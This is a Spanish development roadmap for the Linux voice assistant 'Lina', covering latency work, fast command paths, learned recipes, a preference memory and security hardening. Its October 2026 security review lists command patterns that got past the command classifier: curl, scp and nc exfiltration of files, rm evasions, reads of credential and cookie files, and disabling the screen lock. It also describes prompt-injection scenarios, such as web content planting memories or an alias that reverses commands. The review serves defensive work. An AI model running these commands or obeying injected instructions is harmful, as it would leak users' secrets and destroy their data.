# Plan de mejoras tras la beta (fases 11 a 15)

Objetivo: que Lina responda **al instante** a lo sencillo, **recuerde** lo que le pides que recuerde y sepa más de tu equipo (Bluetooth, juegos, GPU), sin perder
lo que la distingue: lo crítico solo se confirma con el atajo, todo queda en el diario y casi todo se puede deshacer.

Cada fase termina con: pruebas automáticas, textos traducidos (`en.toml`), entrada en el CHANGELOG, documentación y una prueba a mano en un equipo real.
Tamaños relativos: **S** pequeña, **M** media, **L** grande.

| Fase | Qué | Tamaño | Depende de |
|---|---|---|---|
| 11 | Medir dónde se va el tiempo *(hecha)* | S | — |
| 11b | No olvidar la petición tras un paso previo *(hecha)* | S | — |
| 12 | Camino rápido: órdenes simples sin pasar por la IA, y voz sin esperas *(hecha: abrir programa, volumen, silencio, ventanas, hora y música; voz con caché y Piper residente; falta confirmar en el equipo el Piper residente)* | L | 11 |
| 12b | Recetas que se ejecutan solas *(hecha: falta probarla en el equipo de Dani)* | L | 12 |
| 13 | Memoria de preferencias *(hecha: falta probarla en el equipo de Dani)* | M | — |
| 14 | Bluetooth completo y más diagnóstico de juegos *(hecha: falta probarla en el equipo de Dani)* | S | 12 (para sus órdenes directas) |
| 15 | GPU y energía (módulo opcional) *(hecha: falta probarla en el equipo de Dani)* | M | — |
| 17 | Revisión de octubre de 2026: seguridad, latencia y voz, autonomía y mantenimiento *(en curso: S1, S2, S3, S4, S4b (que cierra S4c), S7, V1, V2 y M1 hechas; S5 aparcada)* | L | — |

Fuera del plan, a propósito: excluir monitores de las capturas (Lina captura todos), una ventana de chat con historial (Lina es de voz) y quitar las
confirmaciones por atajo (es una decisión de seguridad, no una carencia).

---

## Fase 11 — Medir (S)

**Para qué:** hoy el registro solo dice «(X s en total)». Sin saber qué parte tarda no se puede decidir qué acelerar.

**Qué se hace**
1. **Cronómetro por fases** en `_voz_a_respuesta` y `_atender` (`nucleo/asistente.py`): fin de la frase → Whisper → decisiones previas del código → llamada a la IA
   (cada vuelta, con tiempo hasta el primer dato y total) → ejecución de herramientas → primera sílaba de Piper → fin de la voz.
2. **Una línea de registro por petición**, sin contenido: `Tiempos [modelo]: whisper 0,9 s · previas 0,1 s · ia 2,1 s · herramientas 0,4 s · sintesis 0,3 s · voz 2,0 s · 2 herramientas · hasta oírte 3,8 s`.
3. **Archivo `tiempos.jsonl`** en la carpeta de estado, solo números y la «ruta» que siguió (IA, directa), rotado a ~200 KB. Nunca la frase dicha.
4. **Orden `lina tiempos`:** media y mediana por fase de las últimas N peticiones y cuál es la fase más lenta.
5. Ajuste `diagnostico.tiempos` (sí por defecto, porque no guarda texto) y entrada en el documento de privacidad.

**Pruebas:** el cronómetro con un reloj falso; que `tiempos.jsonl` no contiene texto; rotación; `lina tiempos` con archivo vacío y con datos.

**Hecho cuando:** sabes, con datos de tu propio equipo, qué fase domina en una orden simple y en una compleja, y fijamos el objetivo de la fase 12
(propuesta: **menos de 1 s** desde el fin de la frase hasta que la acción empieza).

**Resultados de la primera medición (equipo de Dani, 20 órdenes con el atajo):**

| Tipo de orden | Hasta que suena | Dónde se va |
|---|---|---|
| Abrir aplicación, volumen, ventanas | 3,3 – 5,0 s | Whisper 0,6–0,8 · IA 1,3–3,0 (2 llamadas) · acción 0,3–0,7 · síntesis 0,7–0,8 |
| Pregunta sin herramientas | 2,7 – 3,1 s | Whisper 0,7 · IA 1,2–1,5 · síntesis 0,7–0,9 |
| Consulta con herramientas (RAM, CPU, red, batería) | 6,7 – 19 s | La IA (5–17 s); la herramienta tarda ~0 s |
| Búsqueda web | 49,9 s | IA 45 s (esperas de red) |
| Instalar un programa (a fondo) | 30,4 s | IA 17,9 · instalación en segundo plano |

Qué sale de ahí: **1)** cada orden simple cuesta DOS llamadas a la IA (decidir y luego decir «Abierto»); **2)** tras actuar hay una TERCERA, el revisor «¿se cumplió lo pedido?», con espera de hasta 8 s y se prueba con dos modelos: cuando Google va lento, una orden de 3 s pasa a 14 s;
**3)** tras un fallo de red la clave gratuita queda «en pausa» 3 minutos y todo va a la de pago (en un mes: 3,50 € y 466 llamadas); **4)** Piper arranca un proceso por frase (0,7–0,9 s antes de oír nada); **5)** la captura de pantalla se enviaba en todas las peticiones (ya corregido, ver 11b).

---

## Fase 11b — No olvidar la petición (hecha)

**El fallo:** «Abre Stremio» → no está instalado → Lina lo instala (más de 10 s: pasa a segundo plano) → avisa «ya ha terminado» → y nunca lo abre. Se olvidaba de lo que de verdad se pidió.

**Qué se hizo**
1. Al pasar un comando a segundo plano se guarda la petición del usuario. Al terminar bien, Lina **retoma sola esa petición** (espera a no estar hablando contigo), le dice a la IA qué acaba de terminar y que haga lo que falta, sin repetir el paso previo.
2. Tope de 3 vueltas seguidas, para que no dé vueltas sin fin; si falla la tarea o nadie puede retomar, el aviso de siempre.
3. Las instrucciones de la IA dicen que su trabajo es cumplir la petición COMPLETA, no el primer paso, y el mensaje de «sigue en segundo plano» ya no le deja dar la petición por cumplida.

**Pendiente de probar a mano:** «Abre Stremio» con Stremio desinstalado: debe instalarlo y abrirlo sin pedírselo otra vez.

---

## Fase 12 — Camino rápido sin IA (L)

**Para qué:** «ábreme Stremio» o «sube el volumen» no necesitan un modelo: hoy cada orden espera a Gemini.

**Dónde se engancha:** en `_atender`, justo después de las órdenes que el código ya resuelve solo (manos libres, alias, reiniciar, cancelar) y **antes** de la
captura de pantalla y de la IA. Ahí ya hay un patrón: «lo hace el código, sin IA».

### 12.1 Diseño y módulo `nucleo/directas.py`
- Un **registro de acciones directas**. Cada una declara: `id`, frases que la activan (con variantes, sin importar tildes ni mayúsculas), cómo extrae sus parámetros,
  su **nivel de riesgo** y qué función la ejecuta.
- **Solo entran acciones de riesgo bajo** (abrir un programa, volumen, colocar ventanas, reproducción). Nada que borre, instale, apague o toque ajustes del sistema.
- Cada acción **reutiliza lo que ya existe** (`planificar_ventanas`, `planificar_audio`, el abrir aplicaciones) y se ejecuta por el mismo ejecutor, así que pasa por las
  mismas reglas de seguridad y deja su línea en el diario. El camino rápido no es una puerta lateral.
- **Confianza:** cada candidata saca una puntuación. Si hay una ganadora clara y todos los parámetros están, se ejecuta; si hay empate, falta un dato o la frase es
  una pregunta o una negación («¿cómo abro…?», «no abras…»), **cede el paso a la IA**.
- Las frases viven en una sección nueva de `comandos.txt` (el archivo que la IA no puede modificar), para ajustarlas sin tocar código.

### 12.2 Acciones iniciales
| Acción | Ejemplos | Detalle |
|---|---|---|
| Abrir aplicación | «abre Stremio», «ábreme el navegador» | Búsqueda difusa sobre los `.desktop` instalados (ya hay puntuación en `sistema.py`); si hay dos parecidos, a la IA |
| Volumen | «sube el volumen», «ponlo al 40», «silencia», «quita el silencio» | Pasos y límites razonables; nunca más del 100 % |
| Ventanas | «maximiza», «pantalla completa», «minimiza», «pon Firefox en el otro monitor» | Sobre la ventana activa o por nombre; **no incluye cerrar** (puede perder trabajo) |
| Reproducción | «pausa», «siguiente», «anterior», «continúa» | Por MPRIS (`playerctl`) cuando está disponible |

### 12.3 Respuesta y contexto
- La frase que dice Lina la **escribe el código** a partir de una plantilla traducible («Abriendo Stremio»), no una IA.
- La orden se anota en el historial como un turno más, para que «ahora ponla en pantalla completa» tenga a qué referirse.
- **Si la acción falla** (aplicación no encontrada, error del sistema), se cae a la IA con una nota «intenté X y falló», no se queda en silencio.

### 12.4 Seguridad y perfiles
- Lista blanca estricta; parámetros validados; **nunca se construye un comando como texto de shell** (siempre lista de argumentos).
- En el perfil **Prudente** las acciones directas piden la confirmación que ya pedirían; en Equilibrada y Autónoma van directas.
- Interruptor `directas.activo` y orden `lina directas`: lista lo que sabe hacer y **`lina directas probar "ábreme stremio"`** dice qué haría **sin ejecutarlo**.

### 12.5 Menos esperas en lo que sigue pasando por la IA
- **Revisor solo cuando hace falta:** no se llama tras acciones inocuas (abrir un programa, volumen, leer el estado) ni cuando ya hay una comprobación del código; con plazo corto (3 s) y **sin probar un segundo modelo** si el primero no contesta (ante la duda, se da por cumplido, como ya hace).
- **Pausas de modelo más finas:** un fallo de red (timeout) pausa 30 s, no 3 minutos; los 503/429 siguen igual. Si por una pausa se usa la clave de pago, se anota en el registro y en `lina tiempos`.
- **Medir cada llamada a la IA** (duración y resultado) dentro de `lina tiempos`, para saber cuánto cuesta cada vuelta.
- **Voz sin esperas:** caché de las frases fijas («Abierto.», «Hecho.», «Volumen al 40 %») ya sintetizadas por voz, para que suenen al instante, y Piper persistente (no un proceso por frase) para el resto.
- **Objetivo:** orden directa ≤ 1,2 s hasta que suena; con IA, mediana ≤ 3 s y sin picos de más de 10 s por esperas de red.

### 12.6 Pruebas y despliegue
- Tabla de frases → acción (positivas), frases que **no** deben activarse (preguntas, negaciones, frases largas que contienen «abre» por casualidad), ambigüedades,
  parámetros fuera de rango y ejecutor falso de principio a fin.
- Registro «Directa: …» con su tiempo para comparar durante una semana con lo que habría hecho la IA.
- **Hecho cuando:** ≥ 95 % de aciertos en la tabla, **cero** falsos positivos con consecuencias, y el objetivo de latencia de la fase 11 cumplido en tu equipo.

---

## Fase 12b — Recetas que se ejecutan solas (L)

**Para qué:** «desactiva mi cámara» la primera vez hay que descubrirlo (la IA piensa, prueba, comprueba). La segunda debería ser tan rápida como «sube el volumen». Hoy no lo es por dos motivos:

1. **Se aprende muy poco.** Solo se apunta una receta si en la petición hubo UN comando de cambio y luego otro de lectura que mira lo mismo, o un ajuste de KDE comprobado en pantalla, o la IA llama a `guardar_receta` (casi nunca). Lo que lleva varios pasos, o no se lee después, se pierde.
2. **Una receta es una pista, no un atajo.** Aunque exista, la petición va a la IA, que la lee y vuelve a ejecutarla: dos o tres llamadas, de 3 a 20 s según cómo vaya Google.

**Qué se hace**
1. **Aprender de cualquier éxito.** Cuando una petición termina CUMPLIDA (el código lo comprobó o el revisor lo confirma), sin nada pendiente de tu «sí» y sin contenido de internet de por medio, se guarda **la secuencia de pasos que de verdad funcionó**: las herramientas llamadas con sus datos, sin los intentos fallidos ni las exploraciones; el valor que cambió se convierte en `{valor}`; y **cómo se comprobó** (qué lectura confirmó el resultado y qué salida dio).
2. **Repetir sin IA.** Si lo que pides encaja claramente con una receta, el código la ejecuta paso a paso con las mismas herramientas y las mismas reglas de seguridad de siempre (un paso crítico sigue pidiendo tu atajo; una receta no da permisos nuevos), repite la comprobación y dice el resultado. Va delante de la IA, igual que las órdenes directas.
3. **Dirección y valores.** «Activa» y «desactiva» no pueden confundirse: cada receta guarda el efecto que produce y el encaje exige la misma dirección; si no está claro, vale solo como pista, como ahora. Los números («al 40») se sustituyen en `{valor}`.
4. **Si falla, a la IA.** Si un paso da error o la comprobación no da lo esperado, la IA toma el relevo con una nota («la receta falló en tal paso»); dos fallos seguidos y la receta se borra (como ya pasa).
5. **Confianza gradual.** Una receta comprobada por el código (se leyó el estado después y coincide) se repite directamente a la siguiente; una que solo confirmó el revisor necesita un segundo éxito antes de ejecutarse sola.
6. **Control.** `lina recetas` (ver, probar sin ejecutar, borrar), «olvida cómo desactivar la cámara» por voz, ajuste `recetas.directas` para apagarlo, y cada ejecución queda en el diario como cualquier otra acción (se puede deshacer).

**Pruebas:** aprendizaje de secuencias de varios pasos; que no aprende nada de lo fallido, contaminado, pendiente o no cumplido; encaje por dirección (activar/desactivar) y por valor; paso crítico que sigue pidiendo confirmación; fallo a mitad que cae a la IA; borrado tras dos fallos; `lina recetas`.

**Hecho cuando:** pides algo que Lina tuvo que descubrir (p. ej. desactivar la cámara), lo repites y se hace sin llamar a la IA en menos de ~2 s, con la misma comprobación.

---

## Fase 13 — Memoria de preferencias (M)

**Para qué:** «recuerda que mi opción preferida para jugar es Proton-CachyOS» y que Lina lo use en conversaciones futuras. Hoy hay notas, recetas y diario, pero no una
memoria de preferencias.

**Qué se hace**
1. **Almacén** pequeño en la carpeta de datos (SQLite o JSON, a decidir al empezar): texto corto (máx. 300 caracteres), fecha, etiquetas simples; tope de ~200 entradas.
2. **Solo lo que tú pides.** Órdenes resueltas por el código, como los alias: «recuerda que…», «olvida lo de…», «¿qué recuerdas de mí?». Lina **no guarda cosas por
   su cuenta** a partir de lo que oye o lee.
3. **La IA no puede escribir en la memoria.** Así una página web o un archivo con instrucciones ocultas no puede inyectar «recuerdos». La IA solo los **lee**.
4. **Uso:** en cada petición se recuperan por palabras los pocos recuerdos relevantes y se añaden como contexto («Preferencias que el usuario te pidió recordar: …»),
   con tope de tamaño.
5. **Privacidad:** se tapan claves y contraseñas antes de guardar; no se guarda nada que parezca una; `lina memoria` (ver y borrar), `lina olvidar memoria` y su inclusión
   en `lina uninstall --todo` y en el documento de privacidad.

**Pruebas:** guardar y recuperar; que la IA no tenga ninguna herramienta que escriba; inyección desde contenido web (no crea recuerdos); tope y límites; borrado;
tapado de claves; que «olvida» elimina de verdad.

**Hecho cuando:** reinicias Lina, abres una conversación nueva y usa lo que le pediste recordar.

---

## Fase 14 — Bluetooth completo y más diagnóstico de juegos (S)

- **Bluetooth** (`bluetoothctl`): estado del adaptador, dispositivos emparejados y conectados, **conectar y desconectar por nombre aproximado**, batería si el dispositivo
  la informa. «Conecta mis auriculares» pasa a ser una orden directa de la fase 12. Emparejar dispositivos nuevos **no**: pide confirmación.
- **Juegos:** `ver_juegos` y `proton` suman comprobaciones de GameMode, Vulkan y, si están, LSFG y MangoHud. Siempre en modo **diagnóstico** (señalan, no modifican).
- Pruebas con salidas simuladas de `bluetoothctl` y de los comandos de diagnóstico.

---

## Fase 15 — GPU y energía, módulo opcional (M)

**Solo aparece si hay una GPU compatible.**
1. **Detección:** NVIDIA (`nvidia-smi`), AMD (sysfs/hwmon de `amdgpu`) o Intel; si no hay, la herramienta ni se ofrece.
2. **Herramienta `gpu`, de solo lectura:** frecuencias, temperatura, consumo, VRAM usada, límite de potencia y **motivo de la limitación** (térmica, de potencia…).
3. **LACT:** detectar si está, listar perfiles. **Cambiar de perfil es una acción que pide confirmación**, nunca directa.
4. **Registro de métricas a archivo** («cada 2 segundos durante 15 minutos»): tarea en segundo plano con límites de duración, frecuencia y tamaño, salida en CSV
   dentro de una carpeta de Lina; si quieres una hoja de cálculo, la herramienta de hojas ya existente la convierte. No se queda corriendo sin que se sepa: se ve y se
   cancela con `lina procesos`.
5. Pruebas con salidas simuladas de NVIDIA, AMD y sin GPU.

---

## Fase 16 — Encargar trabajos de programación a un agente externo (M, no prioritaria)

Idea apuntada, sin empezar. Lina no lleva un agente de programación dentro: le encarga la tarea al que el usuario ya tenga instalado y con su propia cuenta.

- **Camino elegido**: conectar por MCP (Lina ya tiene el grupo `mcp`). Claude Code puede ofrecerse como servidor MCP (`claude mcp serve`); hay que comprobar con la versión instalada que lo permite y qué herramientas expone. Alternativa si no: lanzarlo como programa con su modo sin pantalla (`claude -p`, `codex exec`).
- **Neutral**: ajuste para elegir qué agente; nada de atarse a uno. No se incluye en Lina (Claude Code es propietario y el proyecto es AGPL): solo se llama al instalado.
- **Seguridad**: apagado por defecto, limitado a una carpeta, confirmación con el atajo antes de empezar, lo que lea de webs o archivos se trata como datos y su propio código y ajustes quedan fuera de su alcance.
- **Voz**: tareas largas en segundo plano con aviso al terminar.
- **Privacidad y coste**: el código que toque sale al proveedor y gasta de su cuenta; se explica antes de activarlo.

## Fase 17 — Revisión de octubre de 2026 (L, por partes)

Sale de una revisión del código completo (23 y 24 de octubre de 2026). Cada punto es un cambio pequeño **con su prueba y su línea en el CHANGELOG**, y se hace
**de uno en uno**, con el plan aprobado antes de tocar código. Tamaños: **S** pequeño, **M** medio, **L** grande.

### Qué se midió antes de proponer nada (seguridad)
Se pasaron ~50 comandos por el clasificador (`tratar_borrado` + `clasificar`) con un `$HOME` de prueba **fuera** de las zonas desechables (en `/tmp` los
borrados salen como autónomos por estar en zona desechable; esa primera medida no valía). Lo que se ejecuta **sin confirmar y sin poder deshacerse** con el
perfil `autonomo`:
- **Sacar archivos del equipo**: `curl -d/-F/--data-binary @archivo`, `curl -T`, `curl "…?q=$(cat … | base64)"`, `wget --post-file`, `tar … | curl -T -`, `scp`,
  `rsync … usuario@host:`, `nc host puerto < archivo`.
- **Borrar por rodeos**: `git clean -fdx`, `c=rm; $c -rf …`, `busybox rm -rf …`, `awk 'BEGIN{system("rm …")}'`, `perl -e 'unlink …'`, `vim -c ':!rm …'`,
  `systemd-run --user rm …`.
- **Ejecutar scripts fuera de Descargas**: `bash ~/proyecto/x.sh`, `source ~/proyecto/x.sh` (en `~/Descargas` sí se confirma).
- **Leer credenciales** (salen como lectura y van a la IA): `~/.config/gh/hosts.yml`, `~/.docker/config.json`, `~/.kube/config`, `~/.git-credentials`, historiales de
  bash y fish, `env`; y `sqlite3` sobre las cookies de Brave/Chromium (las de Firefox sí están bloqueadas).
- **Quitar el bloqueo de pantalla**: `gsettings … screensaver lock-enabled false`, `kwriteconfig6 --file kscreenlockerrc … Autolock false`.

Lo que ya está bien: `rm` va a la papelera; `shred`, `truncate` y `dd` sobre tus archivos se confirman; `find -delete`, `env rm`, `command rm` y `\rm` se bloquean;
`> archivo` y `mv` se ejecutan solos pero el diario guarda copia y se deshacen.

### Seguridad
| # | Qué | Tamaño |
|---|---|---|
| S1 | **Modo privado solo por código** *(hecha)*: la IA solo puede activarlo; quitarlo, frase exacta de `comandos.txt` y solo con el atajo. | S |
| S2 | **La IA no escribe alias de voz** *(hecha; además, enseñar un alias solo con el atajo)*: antes `alias_de_voz` solo exige que lo oído aparezca en tus últimas frases y «significa» es libre, así que un alias inyectado («conecta = desconecta») invertiría órdenes futuras antes de llegar a `directas`. La IA solo podrá listarlos; apuntar y borrar, solo por tus frases («cuando oigas X quiero decir Y»), que ya resuelve el código. | S |
| S3 | **VRAM antes de cargar Ollama** *(hecha)*: el modelo local de reserva solo se carga si lo que ocupará (tamaño en disco × 1,2) más Whisper cabe en `ia.tope_vram_mb` (4096 de fábrica) y hay esa memoria libre. La tarjeta se mide con `nvidia-smi` o, en AMD, por sysfs (el módulo de la gráfica); sin tarjeta se permite (CPU); con una que no se puede leer, solo si ya estaba cargado. En el plan B, Ollama suelta el modelo al minuto. | S |
| S3b | **Plan B que quepa** (sin empezar): con el modelo de fábrica (`qwen3-vl:8b`, ~6 GB) el plan B ya no se carga en un equipo con NVIDIA y Whisper en la tarjeta. Idea: para lo que no necesita la captura, un modelo de texto pequeño en la **CPU** (`num_gpu: 0`, sin VRAM); para lo que sí, buscar un modelo de visión más pequeño que quepa en el tope. Medirlo antes (respuestas, tiempo en la CPU). | M |
| S4 | **Más secretos** *(hecha: bloqueos y confirmaciones para GitHub CLI, Docker/Podman, Kubernetes, git, cookies, autocompletado y clave de los Chromium, rclone, npm, PyPI, Cargo, Terraform, gcloud, Azure, hub, keyrings de GNOME y `pass`; historiales de la terminal y de navegación de los Chromium con confirmación; y lo que imprime un comando llega a la IA sin claves)*: añadir a la lista de credenciales `gh`, `docker`, `kube`, `.git-credentials`, historiales de shell y los perfiles de Chromium/Brave/Vivaldi (`Cookies`, `Login Data`); `env`/`printenv` pasan a tapar valores que parezcan claves. | S |
| S4b | **Tapado en todas las herramientas** *(hecha; cierra S4c)*: `claves.limpiar_para_ia()` en `Asistente.ejecutar_herramienta()`, por donde pasa el resultado de todas (también MCP), más lo confirmado y la nota de una receta que falla; en la configuración de KDE, el valor de las claves con nombre de contraseña o token. | S |
| S4c | **Tapar lo que devuelven los servidores MCP** *(hecha con S4b)*. | S |
| S5 | **Red de salida bloqueada en tareas contaminadas** *(aparcada)*. **Para qué:** que, tras leer una web con instrucciones escondidas, la IA no pueda enviar archivos o datos del equipo a internet. **Dónde:** en `Ejecutor.herramienta()`, justo después de clasificar, y solo si la tarea está contaminada (`ejecutor.contaminado`); sin contenido de fuera no cambia nada, ni el perfil autónomo. **Decisiones tomadas:** `git push` se bloquea solo hacia una URL, no hacia un remoto ya configurado; abrir el navegador con datos sustituidos en la dirección también cuenta como enviar; y el aviso de bloqueo se le dice también al usuario, por voz: qué ha pasado y que puede pedirlo en una petición nueva o hacerlo en su terminal. **Pruebas de uso normal que NO deben bloquearse** en una tarea contaminada: `curl -fsSL` para descargar, `git clone`, `flatpak install`, `dig`, `ping` sin sustitución y `git push` a `origin`. Se aparcó en la revisión de octubre de 2026; la defensa de fondo sigue siendo S9. | M |
| S6 | **Cerrar los rodeos medidos**, cada uno con su prueba: variable usada como programa (`$c …`) → crítico; `busybox`/`toybox` se analizan como el programa que llaman; `awk/gawk … system(`, `perl/ruby -e` → como `python -c` (código en línea); `vim/nvim -c ':!'`, `less +!` → crítico; `systemd-run`, `run0`, `setsid` → se analiza la orden de dentro; `git clean -f` → borrado definitivo; ejecutar un script de cualquier carpeta tuya → software de fuera; bloqueo de pantalla (`gsettings`, `kscreenlockerrc`) → cuentas y credenciales. | M |
| S7 | **Origen por petición en la cola de «además»** *(hecha, y más amplia: el origen va con cada petición, también al interrumpir con el atajo y al retomar; sin origen, manos libres)*: lo que apuntas para después con «Oye Lina» hereda `origen_voz_libre` del último que habló, no el suyo; si entretanto pulsas el atajo, esa frase contaría como dicha con el atajo. Cada entrada de la cola guarda su origen. | S |
| S8 | **`lina update` a releases** *(S8a hecho; S8b, S8c y S8d aparcados)*: hoy sigue `main` (cada commit, no las versiones). En cuatro pasos, con pausa tras S8b para que el mantenedor configure la firma y pruebe `git verify-tag`. **S8a** *(hecho)*: dependencias fijadas en `packaging/requisitos.txt` (versiones exactas y hashes, `uv pip compile --universal`, generado por `scripts/fijar_dependencias.sh`, que comprueba ruedas para Python 3.11 a 3.14; solo `evdev` se compila), instaladas con `--require-hashes` por `install.sh`, `lina update` y el CI (que suma 3.14 y un trabajo informativo con las más recientes); si las de una versión nueva no se instalan, se queda la anterior. `uv.lock` sigue fuera del repositorio. Las librerías de CUDA (`lina modelos gpu`) siguen aparte. **S8b**: etiquetas firmadas con SSH, `packaging/firmas_permitidas`, confianza en el primer uso con copia fuera del código, y en `publicacion.md` cómo configurarla y cómo recuperar la pérdida de la clave. **S8c**: `lina update` a la última etiqueta firmada (sin `--force`, `verify-tag`, CHANGELOG en vez de commits, `--volver` con sus dependencias), nunca sobre una copia propia, y quien va por delante de la última release sigue en `main` hasta la siguiente firmada; `lina update --main` para probadores, con aviso y en el manifiesto. **S8d**: `install.sh` a la última release verificada; `LINA_REF=main` para probadores. Sin paquetes para el Python del usuario: se para y se deja la versión anterior. **S8b, S8c y S8d aparcados por decisión del mantenedor, retomar antes del servicio de pago**: firmar las releases añade un mantenimiento (claves, respaldo, rotación) que no compensa con tan pocos usuarios. Mientras tanto, las alternativas baratas: segundo factor fuerte en GitHub (llave de seguridad o passkey, no SMS) para la cuenta del mantenedor, y protección de etiquetas en el repositorio (reglas de GitHub que impiden crear, mover o borrar `v*` salvo al mantenedor), además de la protección de `main`. | M |
| S9 | **Fase aparte: aislar los comandos de la IA con `bwrap`** (o `systemd-run --user -p ProtectHome=read-only`): carpetas escribibles por lista, red solo cuando haga falta. Es la defensa de fondo frente a una lista negra sobre bash, que nunca estará completa. **Diseño primero** (qué carpetas, cómo convive con el diario, la papelera, `sudo` y los programas con ventana), sin código hasta aprobarlo. **Un motivo más para retomarla (noviembre de 2026):** en la prueba de las fuentes, un reintento a fondo lanzó `grep -rn` sobre la carpeta personal y `/etc`, y el clasificador lo dejó pasar como lectura porque la ruta protegida no aparecía escrita. `_lectura_amplia` cierra esos casos, pero sigue siendo una lista sobre bash: `python3 -c`, una variable o un script la rodean. | L |
| S10 | **Decidir qué debe prometer el modo privado** *(por decidir; sin código)*. Hoy hace esto: sin capturas, sin «Oye Lina», sin hechos recientes y sin probar ajustes de KDE mirando el panel. No es un modo de incógnito: lo que dices sigue yendo a la IA en texto, con la conversación, la ventana activa y las búsquedas, y se sigue guardando lo demás. El manual ya lo dice así. Opciones, combinables: **a) Historial**: vaciarlo al activar y no acumular mientras dure (S). Coste: se pierde el hilo, «¿y eso?» deja de funcionar. La pregunta en curso sigue yendo a la IA. **b) Registro de preguntas**: no apuntar tus frases ni las respuestas en modo privado, como `privacidad.registrar_preguntas` (S). Coste: un fallo en privado es más difícil de diagnosticar. **c) Recetas aprendidas**: no aprender nuevas (S). Coste: lo que resuelva en privado habrá que resolverlo otra vez con IA. **d) Memoria**: no usar los recuerdos, no apuntar nuevos, o las dos cosas (S). Coste: ignora tus preferencias mientras dure; hay que decidir qué responde a «recuerda que…». **Lo que no se puede prometer sin más**: que nada salga del equipo, porque cada petición va a la IA. Eso exigiría usar solo el modelo local (M–L): menos capacidad, sin herramientas en el plan B actual y dentro del tope de 4 GB de VRAM. El registro de acciones y el diario sirven para deshacer cambios: no conviene apagarlos. Si se amplía la promesa, actualizar el manual en español e inglés y añadir una prueba por cada cosa prometida. | S–M |
| S11 | **DNS rebinding en `leer_web`** *(aparcada, como S8b, S8c y S8d: retomar antes del servicio de pago)*: `web._comprobar_destino` resuelve el nombre para revisar que no sea una dirección interna, y `requests` lo resuelve otra vez al descargar. Un dominio que cambie de IP entre las dos veces saltaría la revisión. Afecta a todo `leer_web`, también a la fuente guardada. Las redirecciones sí se revisan salto a salto y tienen prueba (`tests/test_usar_fuente.py`). **Arreglo:** resolver una sola vez y conectar a esa IP comprobada, conservando el nombre para el certificado. Con su prueba. | S |
| S12 | **El reintento de una pregunta no mira el equipo** *(hecha)*: en la prueba de las fuentes, un «no he podido leer la web» disparó un reintento a fondo con ordenador, instalación y servidores MCP: 18 acciones, 102 s y unos 260 mil tokens. Ahora, si la petición no es una orden, no quedó ninguna duda de un cambio y en ella solo se informó, el reintento va con el modelo rápido, hasta 60 s, solo con `buscar_web` y `leer_web`, sin el texto de «no pares» y rechazando lo demás en el código. Si `pensar_a_fondo` lo pidió la IA, conserva su modelo y su tiempo, pero con las mismas herramientas. Las órdenes, el modo «a fondo» pedido por el usuario y el primer intento no cambian. «Lee esa página», sin interrogación, cuando la web bloquea, también insiste como siempre: se pidió esa página y el código vio el obstáculo. Las órdenes de cortesía con un verbo de hacer («¿puedes abrir Steam?», «¿me subes el volumen?», «¿podrías…?», «¿te importa…?») cuentan como órdenes. **Límites:** con otro verbo cuenta como pregunta, aunque mire tu equipo («¿puedes buscar ese archivo?»); una orden como «¿abres Steam?», sin forma de cortesía, también; y lo que decide es la frase que dio Whisper, con sus interrogaciones. | S |

### Latencia y voz
| # | Qué | Tamaño |
|---|---|---|
| V1 | **Cola de voz** *(hecha: turno en orden de llegada, «cállate» descarta lo que espera, avisos de espera que caducan y notificación para avisos y confirmaciones que no llegan a decirse)*: hoy `_hablar` usa un solo `respuesta.wav` y un solo `self.reproductor`; avisos sueltos («lo pienso a fondo», «Google está tardando», el estado) pueden coincidir, pisarse el audio, y «cállate» solo para uno. Un hablante cada vez, archivos propios por frase. | S |
| V2 | **Captura de pantalla solo cuando haga falta** *(hecha: no se captura si no se puede usar; en un juego al pulsar; fuera, tras hablar y solo si hace falta, comprobando de nuevo la privacidad y que sigue la misma ventana; un archivo por petición, borrado al terminar; donde el escritorio no dice qué ventana está activa, al pulsar como antes)*: hoy se hace en cada pulsación, también en modo privado o sin permiso. | S |
| V3 | **Fin de frase por silencio con el atajo** *(V3a, V3b y V3c hechos; periodo de prueba de dos semanas del mantenedor)* (ajuste, apagado por defecto hasta medirlo): una pulsación en vez de dos, con el detector que ya usa el manos libres. En tres pasos, con pausa tras V3a. **V3a** *(hecho)*: `voz/fin_de_frase.py` (la lógica de `Segmentador`, sin corte por longitud, ignorando los primeros 300 ms por el pitido y con espera inicial) y `lina probar-voz silencio`, que pasa las grabaciones de `probar-voz` por el detector, con una cola sintética del ruido de fondo de cada grabación (terminan donde se pulsó Intro), y compara lo que entiende Whisper con el audio cortado y con el completo. Con las 288 grabaciones del mantenedor (15 cortas y 91 en silencio, con ruido y con la música bajando al 20 %): con 0,8 s, 1 frase cortada (una pausa a media frase, con la música bajando); con 1,0 s o más, ninguna. Casi siempre corta en la cola: se pulsaba Intro ~0,2 s después de hablar, así que el fin por silencio tardaría +0,6 s (0,8), +0,8 s (1,0) o +1,0 s (1,2) más que pulsar. Con la música bajando, 6–8 de 91 nunca cortan (habría que pulsar): si se empieza a hablar enseguida, el detector no aprende el nivel de la música (el umbral se queda en el mínimo, 0,012, y la música al 20 % ronda ese nivel); es el mismo límite del manos libres. **El pitido de «te escucho» no está en esas grabaciones: lo cubren pruebas sintéticas y lo comprueba el mantenedor en vivo en V3b.** **V3b** *(hecho)*: ajustes `activacion.fin_por_silencio` (apagado de fábrica: doble pulsación, como siempre), `activacion.silencio_atajo` (1,0 s) y `activacion.espera_atajo` (6 s); tope de 60 s y margen de 1 s tras el corte (constantes). Termine como termine (pulsación, silencio, «No te he oído» o tope), se cierra el micrófono y luego suena el pitido de 520 Hz; sin voz no se pasa nada a Whisper; la frase se procesa una vez aunque el corte coincida con la pulsación (cerrojo y número de grabación; prueba determinista con barrera). La interrupción sigue con dos pulsaciones. El límite con la música queda como límite conocido (no se cambia el detector). **Pendiente de comprobar en vivo por el mantenedor**: que el pitido de inicio no corta ni cuenta como voz, y el margen de 1 s. **V3c** *(hecho)*: `escuchas.jsonl` aparte (para que el recorte de `tiempos.jsonl` no se coma la primera semana; últimas 5000 líneas), una línea por escucha del atajo con solo el día (sin hora), el modo de terminar (silencio, pulsación, «No te he oído», tope o pulsación ignorada) y números (duración, espera desde la voz, segundos desde un corte por silencio si son menos de 10: posible corte a destiempo); respeta `privacidad.registrar_tiempos` y lo borra `lina olvidar tiempos`. Resumen: `lina tiempos escucha [días]` (14 por defecto). **Para activarlo por defecto**: con el valor elegido, ninguna frase cortada que cambie lo que entiende Lina en las tandas en silencio y con la música bajando, espera media menor de 1 s, y unas semanas de `lina tiempos` sin sorpresas; la tanda con ruido sin bajar se mide pero no decide. | M |
